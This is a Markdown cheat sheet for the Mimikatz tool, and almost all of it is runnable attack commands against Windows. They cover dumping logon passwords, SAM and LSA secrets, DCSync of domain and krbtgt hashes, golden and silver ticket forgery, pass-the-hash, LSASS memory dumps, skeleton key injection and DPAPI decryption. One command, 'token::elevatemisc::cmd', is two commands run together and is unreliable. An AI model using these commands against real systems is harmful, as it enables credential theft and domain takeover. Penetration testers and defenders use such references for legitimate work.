# Mimikatz

## **Starting Mimikatz**

#### **Interactive Mode**

```
.\mimikatz.exe
```

#### **Single Command Execution**

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
```

#### **Enable Debug Privileges**

```
privilege::debug
```

## Core Commands

#### **General Commands**

```
help                     #List all available commands
exit                     #Quit Mimikatz
log file.txt             #Log all output to a file
version                  #Display Mimikatz version
```

#### **Privilege Escalation**

```
privilege::debug         #Enable debug privileges
token::whoami            #Check the current token privileges
token::elevate           #Attempt to elevate the token privileges
token::revert            #Revert to original token
```

## Password and Hash Dumping

#### **Local Credential Dumping**

```
sekurlsa::logonpasswords     #Dump credentials of logged-in users
sekurlsa::credman            #Retrieve saved credentials in Credential Manager
```

#### **Extract NTLM Hashes**

```
lsadump::sam                 #Dump hashes from the SAM database
lsadump::lsa /inject         #Extract secrets from LSA
lsadump::secrets             #Extract stored secrets (e.g., service account passwords)
```

#### **Domain Controller Hash Extraction (DCSync)**

{% code overflow="wrap" %}

```
lsadump::dcsync /domain:example.com /user:Administrator  #Sync NTLM hash for user 
lsadump::dcsync /all /domain:example.com                 #Sync all domain NTLM hashes
lsadump::dcsync /domain:example.com /user:krbtgt         #Extract Kerberos TGT hash
```

{% endcode %}

## Kerberos Operations

#### **List and Export Tickets**

```
kerberos::list                 #List all Kerberos tickets
kerberos::list /export         #Export tickets to .kirbi files
```

#### **Pass-the-Ticket**

```
kerberos::ptt ticket.kirbi     #Inject a Kerberos ticket
```

#### **Golden Ticket Creation**

{% code overflow="wrap" %}

```
kerberos::golden /domain:<domain> /sid:S-1-5-21... /krbtgt:<hash> /user:Administrator
```

{% endcode %}

#### **Silver Ticket Creation**

{% code overflow="wrap" %}

```
kerberos::golden /domain:<domain> /sid:S-1-5-21... /target:SERVER /rc4:<hash> /user:User
```

{% endcode %}

#### **Kerberos Delegation Tickets**

{% code overflow="wrap" %}

```
kerberos::golden /domain:<domain> /sid:S-1-5-21... /user:Administrator /rc4:<hash> /service:krbtgt
```

{% endcode %}

## Pass-the-Hash

#### **Perform Pass-the-Hash Attack**

```
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
```

#### **Combine with PowerShell**

```
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:powershell.exe
```

## Dumping LSASS Memory

#### **Live Dump**

Extract credentials directly from memory:

```
sekurlsa::logonpasswords         
```

#### **Offline Analysis**

```
procdump.exe -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

## Generating Skeleton Keys

Inject a universal key to authenticate any domain account:

```
misc::skeleton
```

## Credential Extraction via DPAPI

#### **Extract Master Keys**

```
dpapi::masterkey /in:<file>
```

#### **Decrypt Credentials**

```
dpapi::cred /in:<credential_file>
dpapi::wifi /in:<wireless_profile.xml>
```

## Exporting and Logging

**Export Logs**

Save output to a file:

```
log log.txt
```

**Export Kerberos Tickets**

Save tickets to .kirbi files:

```
kerberos::list /export
```

## Advanced Examples and Use Cases

#### **Extracting Service Account Passwords**

```
lsadump::secrets /inject
```

#### **Bypassing RunAs Restrictions**

```
token::elevatemisc::cmd
```

#### **Stealing Cached Credentials**

```
sekurlsa::logonpasswords
```
